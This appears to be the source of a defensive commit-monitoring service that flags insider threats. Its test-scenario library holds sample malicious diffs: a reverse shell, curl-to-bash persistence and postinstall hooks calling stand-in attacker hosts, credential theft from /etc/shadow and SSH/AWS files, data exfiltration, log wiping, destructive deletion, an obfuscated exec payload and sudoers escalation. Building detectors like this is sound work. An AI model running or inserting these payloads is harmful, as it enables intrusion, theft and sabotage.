# Swimlane commit feed (grouped by repo)
# ---------------------------------------------------------------------------
@router.get("/commits/by-repo")
async def get_commits_by_repo(
    risk_level: Optional[str] = None,
    limit_per_repo: int = Query(default=10, le=50),
    current_user: User = Depends(get_current_active_user),
):
    """Commits grouped by repo — powers swimlane view in Commit Feed tab."""
    conn = _sqlite_conn()
    cursor = conn.cursor()

    # Get active repos
    cursor.execute("SELECT id, full_name FROM github_monitored_repos WHERE active=1 ORDER BY full_name")
    repos = [dict(r) for r in cursor.fetchall()]

    result = []
    for repo in repos:
        repo_id = repo["id"]
        params = [repo_id]
        risk_filter = ""
        if risk_level:
            risk_filter = "AND gcs.risk_level = ?"
            params.append(risk_level)

        cursor.execute(f"""
            SELECT gcs.*,
                   (SELECT COUNT(*) FROM github_commit_findings WHERE scan_id=gcs.id) as finding_count,
                   (SELECT COUNT(*) FROM github_sensitive_file_alerts WHERE scan_id=gcs.id) as sensitive_file_count
            FROM github_commit_scans gcs
            WHERE gcs.repo_id=? {risk_filter}
            ORDER BY gcs.committed_at DESC
            LIMIT ?
        """, params + [limit_per_repo])
        commits = [dict(r) for r in cursor.fetchall()]
        for c in commits:
            c["repo_full_name"] = repo["full_name"]
            if c.get("signals"):
                try:
                    c["signals"] = json.loads(c["signals"])
                except Exception:
                    c["signals"] = []

        if commits:  # only include repos that have commits matching the filter
            result.append({
                "repo_id": repo_id,
                "repo_full_name": repo["full_name"],
                "commits": commits,
            })

    conn.close()
    return {"repos": result}


# ---------------------------------------------------------------------------
# Developer timeline (for profile card sparkline)
# ---------------------------------------------------------------------------
@router.get("/developers/{author_email:path}/timeline")
async def get_developer_timeline(
    author_email: str,
    days: int = Query(default=14, le=30),
    current_user: User = Depends(get_current_active_user),
):
    """Per-developer daily commit activity — backs developer card sparkline."""
    from datetime import date, timedelta

    conn = _sqlite_conn()
    cursor = conn.cursor()
    cursor.execute(f"""
        SELECT
            date(committed_at) as day,
            COUNT(*) as commits,
            ROUND(AVG(risk_score), 2) as avg_score,
            MAX(risk_score) as peak_score,
            SUM(CASE WHEN risk_level IN ('high','critical') THEN 1 ELSE 0 END) as risky
        FROM github_commit_scans
        WHERE author_email=?
          AND committed_at >= date('now', '-{days} days')
        GROUP BY day
        ORDER BY day ASC
    """, (author_email,))
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()

    today = date.today()
    day_list = [(today - timedelta(days=days - 1 - i)).isoformat() for i in range(days)]
    day_map = {r["day"]: r for r in rows}
    filled = [day_map.get(d, {"day": d, "commits": 0, "avg_score": 0, "peak_score": 0, "risky": 0}) for d in day_list]

    return {"days": day_list, "activity": filled}


# ---------------------------------------------------------------------------
# AI-powered commit analysis
# ---------------------------------------------------------------------------
@router.post("/commits/{scan_id}/ai-analyze")
async def ai_analyze_commit(
    scan_id: int,
    current_user: User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Run AI analysis on a commit to determine impact and possible malicious intent."""
    conn = _sqlite_conn()
    cursor = conn.cursor()

    # Fetch commit scan
    cursor.execute(
        """SELECT gcs.*, gmr.full_name as repo_full_name
           FROM github_commit_scans gcs
           JOIN github_monitored_repos gmr ON gcs.repo_id = gmr.id
           WHERE gcs.id = ?""",
        (scan_id,)
    )
    row = cursor.fetchone()
    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Commit scan not found.")
    scan = dict(row)

    # Fetch findings with rule metadata
    cursor.execute("""
        SELECT gcf.*, cr.description AS rule_description, cr.cwe, cr.owasp
        FROM github_commit_findings gcf
        LEFT JOIN custom_rules cr ON gcf.rule_id = cr.id
        WHERE gcf.scan_id = ?
        ORDER BY CASE gcf.severity WHEN 'critical' THEN 1 WHEN 'high' THEN 2 WHEN 'medium' THEN 3 ELSE 4 END
    """, (scan_id,))
    findings = [dict(r) for r in cursor.fetchall()]

    # Fetch sensitive file alerts
    cursor.execute("SELECT * FROM github_sensitive_file_alerts WHERE scan_id=?", (scan_id,))
    sensitive_files = [dict(r) for r in cursor.fetchall()]

    # Parse signals
    signals = []
    if scan.get("signals"):
        try:
            signals = json.loads(scan["signals"])
        except Exception:
            pass

    conn.close()

    # Build the analysis prompt
    findings_text = ""
    for f in findings:
        findings_text += (
            f"\n  - [{f['severity'].upper()}] {f['rule_name']}"
            f" in {f.get('file_path','?')} line {f.get('line_number','?')}"
        )
        if f.get("matched_text"):
            # Truncate matched text to avoid huge prompts
            mtext = f["matched_text"][:300]
            findings_text += f"\n    Code: `{mtext}`"
        if f.get("rule_description"):
            findings_text += f"\n    Rule: {f['rule_description']}"
        if f.get("cwe"):
            findings_text += f"  CWE: {f['cwe']}"
        if f.get("owasp"):
            findings_text += f"  OWASP: {f['owasp']}"

    sensitive_text = ""
    for s in sensitive_files:
        sensitive_text += f"\n  - {s['file_path']} (matched pattern: {s['pattern_matched']})"

    signal_text = ", ".join(signals) if signals else "none"

    prompt = f"""You are a senior application security analyst specializing in insider threat detection.

Analyze the following git commit and provide a structured threat assessment.

## Commit Details
- **Repository**: {scan.get('repo_full_name', 'unknown')}
- **SHA**: {scan.get('sha', '')[:12]}
- **Author**: {scan.get('author_name', 'unknown')} <{scan.get('author_email', '')}>
- **Committer**: {scan.get('committer_name', 'unknown')} <{scan.get('committer_email', '')}>
- **Message**: {scan.get('commit_message', '(no message)')}
- **Committed at**: {scan.get('committed_at', 'unknown')}
- **Risk Score**: {scan.get('risk_score', 0)}/10 ({scan.get('risk_level', 'unknown').upper()})
- **Files changed**: {scan.get('files_changed', 0)} (+{scan.get('additions', 0)} / -{scan.get('deletions', 0)} lines)

## Behavioral Signals
{signal_text}

## SAST Findings ({len(findings)} total)
{findings_text if findings_text else '  None'}

## Sensitive Files Touched ({len(sensitive_files)} total)
{sensitive_text if sensitive_text else '  None'}

---

Respond ONLY with a valid JSON object (no markdown fences) matching this schema:
{{
  "threat_level": "intentional_insider" | "suspicious" | "negligent" | "false_positive",
  "confidence": 0.0-1.0,
  "impact_summary": "2-3 sentence description of the real-world security impact",
  "intent_analysis": "2-3 sentence analysis of whether this looks intentional, accidental, or benign",
  "malicious_scenario": "If this were malicious, describe the most likely attack scenario in 2-3 sentences. Write null if confidence < 0.3.",
  "key_indicators": ["indicator 1", "indicator 2", ...],
  "recommended_actions": ["action 1", "action 2", ...]
}}"""

    # Call AI
    try:
        from services.ai_client_factory import get_ai_client, AIConfig
        ai_config = AIConfig.from_user(current_user)
        factory = get_ai_client(ai_config)
        result = factory.chat_completion(
            messages=[
                {"role": "system", "content": "You are a cybersecurity expert specializing in insider threat analysis. Respond only with valid JSON."},
                {"role": "user", "content": prompt}
            ],
            max_tokens=1500,
            temperature=0.3
        )
        raw_response = result.get("content", "")
    except Exception as e:
        logger.error(f"AI analysis failed for scan {scan_id}: {e}")
        raise HTTPException(status_code=500, detail=f"AI analysis failed: {str(e)}")

    # Parse the JSON response
    try:
        # Strip markdown fences if model included them despite instructions
        clean = raw_response.strip()
        if clean.startswith("```"):
            clean = clean.split("```")[1]
            if clean.startswith("json"):
                clean = clean[4:]
        analysis = json.loads(clean.strip())
    except Exception as e:
        logger.error(f"Failed to parse AI response JSON: {e}\nRaw: {raw_response[:500]}")
        raise HTTPException(status_code=500, detail="AI returned invalid JSON. Try again.")

    # Normalize fields
    threat_level = analysis.get("threat_level", "suspicious")
    confidence = float(analysis.get("confidence", 0.5))
    key_indicators = analysis.get("key_indicators", [])
    recommended_actions = analysis.get("recommended_actions", [])

    # Upsert into DB
    conn2 = _sqlite_conn()
    c2 = conn2.cursor()
    c2.execute("""
        INSERT INTO github_commit_ai_analysis
            (scan_id, threat_level, confidence, impact_summary, intent_analysis,
             malicious_scenario, key_indicators, recommended_actions, raw_response, model_used)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(scan_id) DO UPDATE SET
            threat_level=excluded.threat_level,
            confidence=excluded.confidence,
            impact_summary=excluded.impact_summary,
            intent_analysis=excluded.intent_analysis,
            malicious_scenario=excluded.malicious_scenario,
            key_indicators=excluded.key_indicators,
            recommended_actions=excluded.recommended_actions,
            raw_response=excluded.raw_response,
            model_used=excluded.model_used,
            analyzed_at=datetime('now')
    """, (
        scan_id,
        threat_level,
        confidence,
        analysis.get("impact_summary"),
        analysis.get("intent_analysis"),
        analysis.get("malicious_scenario"),
        json.dumps(key_indicators),
        json.dumps(recommended_actions),
        raw_response,
        ai_config.model or ai_config.provider or "unknown"
    ))
    conn2.commit()
    conn2.close()

    return {
        **analysis,
        "threat_level": threat_level,
        "confidence": confidence,
        "key_indicators": key_indicators,
        "recommended_actions": recommended_actions,
        "scan_id": scan_id,
    }


# ---------------------------------------------------------------------------
# Test Scenario Library
# ---------------------------------------------------------------------------

TEST_SCENARIOS = [
    {
        "id": "data_exfil_http",
        "name": "HTTP Data Exfiltration",
        "category": "exfiltration",
        "description": "Employee reading production database and posting contents to an external IP using requests.",
        "expected_risk": "critical",
        "tags": ["database", "http", "exfil"],
        "diff": """\
--- a/utils/db_maintenance.py
+++ b/utils/db_maintenance.py
@@ -0,0 +1,18 @@
+import requests
+import sqlite3
+import base64
+
+# Routine DB maintenance helper
+def _sync_backup(conn_str: str):
+    conn = sqlite3.connect(conn_str)
+    cursor = conn.cursor()
+    cursor.execute('SELECT id, email, password_hash, api_key FROM users')
+    rows = cursor.fetchall()
+    conn.close()
+    payload = base64.b64encode(str(rows).encode()).decode()
+    requests.post(
+        'http://192.168.50.100:4444/collect',
+        json={'host': 'prod-db', 'data': payload},
+        timeout=5
+    )
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T02:30:00Z", "email": "dev@company.com"},
                "committer": {"date": "2024-03-15T02:30:00Z", "email": "dev@company.com"},
                "verification": {"verified": False},
                "message": "fix: db maintenance helper update"
            },
            "stats": {"additions": 18, "deletions": 0}
        },
    },
    {
        "id": "reverse_shell",
        "name": "Reverse Shell Backdoor",
        "category": "backdoor",
        "description": "Socket-based reverse shell hidden inside a utility module. Connects back to attacker C2.",
        "expected_risk": "critical",
        "tags": ["shell", "socket", "c2", "subprocess"],
        "diff": """\
--- a/utils/net_helper.py
+++ b/utils/net_helper.py
@@ -0,0 +1,20 @@
+import socket
+import subprocess
+import os
+
+# Network diagnostic helper
+def _check_connectivity(host: str = '10.0.0.5', port: int = 4444):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(['/bin/bash', '-i'])
+    except Exception:
+        pass
+
+def _install_persistence():
+    os.system('echo "* * * * * curl http://c2.attacker.com/beacon | bash" | crontab -')
+    os.system('echo "* * * * * /usr/bin/python3 /tmp/.helper.py" >> /etc/crontab')
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T03:15:00Z", "email": "intern@company.com"},
                "committer": {"date": "2024-03-15T03:15:00Z", "email": "intern@company.com"},
                "verification": {"verified": False},
                "message": "chore: add network diagnostic helper"
            },
            "stats": {"additions": 20, "deletions": 0}
        },
    },
    {
        "id": "credential_harvest",
        "name": "Credential Harvesting",
        "category": "credential_theft",
        "description": "Reads /etc/shadow, SSH private keys, and AWS credentials then stages them in /tmp.",
        "expected_risk": "critical",
        "tags": ["shadow", "ssh", "aws", "credentials"],
        "diff": """\
--- a/scripts/sys_audit.py
+++ b/scripts/sys_audit.py
@@ -0,0 +1,22 @@
+import os
+import shutil
+
+STAGE_DIR = '/tmp/.audit_cache'
+
+def collect_system_info():
+    os.makedirs(STAGE_DIR, exist_ok=True)
+
+    # Collect system credentials
+    with open('/etc/shadow', 'r') as f:
+        shadow_data = f.read()
+    with open('/etc/passwd', 'r') as f:
+        passwd_data = f.read()
+
+    ssh_key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
+    aws_creds = open(os.path.expanduser('~/.aws/credentials')).read()
+
+    with open(f'{STAGE_DIR}/creds.txt', 'w') as out:
+        out.write(shadow_data + passwd_data + ssh_key + aws_creds)
+
+    shutil.copy(os.path.expanduser('~/.gnupg/secring.gpg'), STAGE_DIR)
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-14T23:50:00Z", "email": "sysadmin@company.com"},
                "committer": {"date": "2024-03-14T23:50:00Z", "email": "contractor@external.com"},
                "verification": {"verified": False},
                "message": "ops: system audit collection script"
            },
            "stats": {"additions": 22, "deletions": 0}
        },
    },
    {
        "id": "sabotage_deletion",
        "name": "Infrastructure Sabotage",
        "category": "sabotage",
        "description": "Mass file deletion combined with database table drops. Classic disgruntled employee pattern.",
        "expected_risk": "critical",
        "tags": ["rm-rf", "drop-table", "shutil", "sabotage"],
        "diff": """\
--- a/scripts/cleanup.py
+++ b/scripts/cleanup.py
@@ -0,0 +1,24 @@
+import shutil
+import subprocess
+import os
+
+def run_cleanup(env: str = 'prod'):
+    # Remove application data
+    shutil.rmtree('/var/www/html', ignore_errors=True)
+    shutil.rmtree('/opt/app/data', ignore_errors=True)
+    shutil.rmtree('/opt/app/uploads', ignore_errors=True)
+
+    # Drop all database tables
+    import psycopg2
+    conn = psycopg2.connect(os.environ['DATABASE_URL'])
+    cur = conn.cursor()
+    cur.execute('DROP TABLE IF EXISTS users CASCADE')
+    cur.execute('DROP TABLE IF EXISTS payments CASCADE')
+    cur.execute('DROP TABLE IF EXISTS orders CASCADE')
+    cur.execute('DROP SCHEMA public CASCADE')
+    conn.commit()
+
+    # Remove backups
+    subprocess.run(['rm', '-rf', '/var/backups/app'], check=False)
+    subprocess.run(['rm', '-rf', '/home/deploy/.ssh'], check=False)
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T01:00:00Z", "email": "angry.dev@company.com"},
                "committer": {"date": "2024-03-15T01:00:00Z", "email": "angry.dev@company.com"},
                "verification": {"verified": False},
                "message": "chore: cleanup script"
            },
            "stats": {"additions": 24, "deletions": 650}
        },
    },
    {
        "id": "log_tampering",
        "name": "Log Tampering & Anti-Forensics",
        "category": "anti_forensics",
        "description": "Clears audit logs, bash history, and disables auditd to cover tracks.",
        "expected_risk": "high",
        "tags": ["logs", "history", "auditd", "cover-tracks"],
        "diff": """\
--- a/scripts/log_rotate.sh
+++ b/scripts/log_rotate.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+# Log rotation maintenance
+
+# Clear sensitive logs
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+echo "" > /var/log/audit/audit.log
+echo "" > /var/log/secure
+
+# Disable audit daemon
+auditctl -e 0
+service auditd stop
+
+# Clear shell history
+history -c
+unset HISTFILE
+rm -rf ~/.bash_history
+cat /dev/null > ~/.bash_history
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T04:00:00Z", "email": "ops@company.com"},
                "committer": {"date": "2024-03-15T04:00:00Z", "email": "ops@company.com"},
                "verification": {"verified": False},
                "message": "ops: log rotation script"
            },
            "stats": {"additions": 18, "deletions": 0}
        },
    },
    {
        "id": "supply_chain",
        "name": "Supply Chain Injection",
        "category": "supply_chain",
        "description": "Malicious postinstall hook in package.json that downloads and executes a remote payload.",
        "expected_risk": "critical",
        "tags": ["npm", "postinstall", "supply-chain", "curl"],
        "diff": """\
--- a/package.json
+++ b/package.json
@@ -4,6 +4,9 @@
   \"version\": \"2.1.0\",
   \"scripts\": {
     \"build\": \"webpack --config webpack.config.js\",
+    \"postinstall\": \"node -e \\\"require('child_process').execSync('curl -s http://malicious-cdn.com/setup.sh | bash')\\\"\",
+    \"prestart\": \"curl -fsSL http://c2.evil.com/payload | bash\",
     \"start\": \"node server.js\",
     \"test\": \"jest\"
   },
   \"dependencies\": {
+    \"lодash\": \"4.17.11\",
+    \"expres\": \"^4.18.2\"
   }
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T10:00:00Z", "email": "deps-bot@company.com"},
                "committer": {"date": "2024-03-15T10:00:00Z", "email": "deps-bot@company.com"},
                "verification": {"verified": False},
                "message": "chore: update dependencies"
            },
            "stats": {"additions": 5, "deletions": 0}
        },
    },
    {
        "id": "eval_obfuscation",
        "name": "Obfuscated Code Execution",
        "category": "backdoor",
        "description": "Base64-encoded payload executed via eval/exec. Used to hide malicious logic from code review.",
        "expected_risk": "critical",
        "tags": ["eval", "exec", "base64", "obfuscation"],
        "diff": """\
--- a/utils/config_loader.py
+++ b/utils/config_loader.py
@@ -1,5 +1,14 @@
+import base64
+import os
+
 def load_config(path: str) -> dict:
+    # Bootstrap configuration
+    _cfg = os.environ.get('APP_BOOTSTRAP', '')
+    if _cfg:
+        exec(base64.b64decode(_cfg).decode())
+
+    # Load runtime patch
+    _patch = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2MyLmF0dGFja2VyLmNvbS9iZWFjb24nKQ==').decode()
+    eval(compile(_patch, '<string>', 'exec'))
+
     with open(path) as f:
         return json.load(f)
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T09:00:00Z", "email": "backend@company.com"},
                "committer": {"date": "2024-03-15T09:00:00Z", "email": "backend@company.com"},
                "verification": {"verified": False},
                "message": "feat: dynamic config loader with bootstrap support"
            },
            "stats": {"additions": 12, "deletions": 0}
        },
    },
    {
        "id": "ip_theft",
        "name": "Intellectual Property Theft",
        "category": "exfiltration",
        "description": "Zips the entire source tree and uploads to personal cloud storage using a hardcoded token.",
        "expected_risk": "high",
        "tags": ["zip", "upload", "cloud", "ip-theft"],
        "diff": """\
--- a/tools/project_export.py
+++ b/tools/project_export.py
@@ -0,0 +1,22 @@
+import os
+import zipfile
+import requests
+from datetime import datetime
+
+PERSONAL_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.personal_token_here'
+UPLOAD_URL = 'https://storage.personal-dropbox.com/api/upload'
+
+def export_project(src_dir: str = '/opt/app/src'):
+    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+    archive = f'/tmp/.export_{ts}.zip'
+
+    with zipfile.ZipFile(archive, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for root, dirs, files in os.walk(src_dir):
+            for file in files:
+                zf.write(os.path.join(root, file))
+
+    with open(archive, 'rb') as f:
+        requests.put(UPLOAD_URL, data=f,
+                     headers={'Authorization': f'Bearer {PERSONAL_TOKEN}'},
+                     timeout=60)
+    os.remove(archive)
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T17:45:00Z", "email": "senior.dev@company.com"},
                "committer": {"date": "2024-03-15T17:45:00Z", "email": "senior.dev@company.com"},
                "verification": {"verified": False},
                "message": "tools: project export utility"
            },
            "stats": {"additions": 22, "deletions": 0}
        },
    },
    {
        "id": "privilege_escalation",
        "name": "Privilege Escalation",
        "category": "privilege_escalation",
        "description": "Adds SUID bit to Python binary and grants passwordless sudo to the web service account.",
        "expected_risk": "critical",
        "tags": ["sudo", "suid", "chmod", "privesc"],
        "diff": """\
--- a/scripts/install.sh
+++ b/scripts/install.sh
@@ -10,4 +10,12 @@
 pip install -r requirements.txt

+# Runtime permission setup
+chmod u+s /usr/bin/python3
+chmod 4755 /usr/bin/bash
+usermod -aG sudo webservice
+usermod -aG wheel deploy
+
+# Sudoers config
+echo 'webservice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'deploy ALL=(ALL) NOPASSWD:/bin/bash' | tee -a /etc/sudoers.d/deploy
+
 systemctl restart app
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T11:30:00Z", "email": "devops@company.com"},
                "committer": {"date": "2024-03-15T11:30:00Z", "email": "contractor@outsourced.com"},
                "verification": {"verified": False},
                "message": "fix: install script permissions"
            },
            "stats": {"additions": 10, "deletions": 0}
        },
    },
    {
        "id": "legitimate_feature",
        "name": "Legitimate Feature Addition",
        "category": "baseline",
        "description": "Normal feature PR adding a user score calculation. Should score clean or very low.",
        "expected_risk": "clean",
        "tags": ["feature", "no-threat", "baseline"],
        "diff": """\
--- a/services/scoring.py
+++ b/services/scoring.py
@@ -0,0 +1,22 @@
+from typing import Optional
+from models import User, UserActivity
+
+
+def calculate_engagement_score(user_id: int) -> float:
+    \"\"\"Return a 0-1 engagement score based on recent activity.\"\"\"
+    user = User.query.get(user_id)
+    if not user:
+        return 0.0
+
+    activity_count = UserActivity.query.filter_by(
+        user_id=user_id,
+        event_type='page_view'
+    ).count()
+
+    return min(activity_count / 100.0, 1.0)
+
+
+def get_tier(score: float) -> str:
+    if score >= 0.8:
+        return 'platinum'
+    if score >= 0.5:
+        return 'gold'
+    return 'standard'
""",
        "commit_metadata": {
            "commit": {
                "author":    {"date": "2024-03-15T10:00:00Z", "email": "alice@company.com"},
                "committer": {"date": "2024-03-15T10:00:00Z", "email": "alice@company.com"},
                "verification": {"verified": True},
                "message": "feat: add user engagement scoring"
            },
            "stats": {"additions": 22, "deletions": 0}
        },
    },
]

SCENARIO_INDEX = {s["id"]: s for s in TEST_SCENARIOS}


@router.get("/test-scenarios")
async def list_test_scenarios(
    current_user: User = Depends(get_current_active_user),
):
    """Return all built-in test scenarios (without the diff text)."""
    return [
        {k: v for k, v in s.items() if k != "diff" and k != "commit_metadata"}
        for s in TEST_SCENARIOS
    ]


@router.post("/test-scenarios/{scenario_id}/run")
async def run_test_scenario(
    scenario_id: str,
    current_user: User = Depends(get_current_active_user),
):
    """Run a built-in test scenario through the commit analyzer and return results."""
    scenario = SCENARIO_INDEX.get(scenario_id)
    if not scenario:
        raise HTTPException(status_code=404, detail=f"Scenario '{scenario_id}' not found.")

    from services.commit_analyzer import CommitAnalyzer
    import os

    db_path = "/app/data/appsec.db" if os.path.exists("/app/data") else "appsec.db"
    analyzer = CommitAnalyzer(db_path=db_path)

    result = analyzer.analyze_commit(
        commit_data=scenario["commit_metadata"],
        diff_text=scenario["diff"],
    )

    # Build rule-enriched findings list
    rule_ids = [f.rule_id for f in result.findings if f.rule_id]
    rule_meta: dict = {}
    if rule_ids:
        try:
            conn = _sqlite_conn()
            placeholders = ",".join("?" * len(rule_ids))
            rows = conn.execute(
                f"SELECT id, description, cwe, owasp, remediation FROM custom_rules WHERE id IN ({placeholders})",
                rule_ids
            ).fetchall()
            conn.close()
            rule_meta = {r["id"]: dict(r) for r in rows}
        except Exception:
            pass

    findings_out = []
    for f in result.findings:
        meta = rule_meta.get(f.rule_id, {})
        findings_out.append({
            "rule_name":        f.rule_name,
            "rule_id":          f.rule_id,
            "severity":         f.severity,
            "file_path":        f.file_path,
            "line_number":      f.line_number,
            "matched_text":     f.matched_text,
            "rule_description": meta.get("description"),
            "cwe":              meta.get("cwe"),
            "owasp":            meta.get("owasp"),
            "remediation":      meta.get("remediation"),
        })

    sensitive_out = [
        {"file_path": s.file_path, "pattern_matched": s.pattern_matched}
        for s in result.sensitive_files
    ]

    return {
        "scenario_id":    scenario_id,
        "scenario_name":  scenario["name"],
        "category":       scenario["category"],
        "expected_risk":  scenario["expected_risk"],
        "risk_score":     result.risk_score,
        "risk_level":     result.risk_level,
        "signals":        result.signals,
        "findings":       findings_out,
        "sensitive_files": sensitive_out,
        "passed":         result.risk_level == scenario["expected_risk"]
                          or (scenario["expected_risk"] == "clean" and result.risk_level in ("clean", "low")),
        "diff":           scenario["diff"],
    }
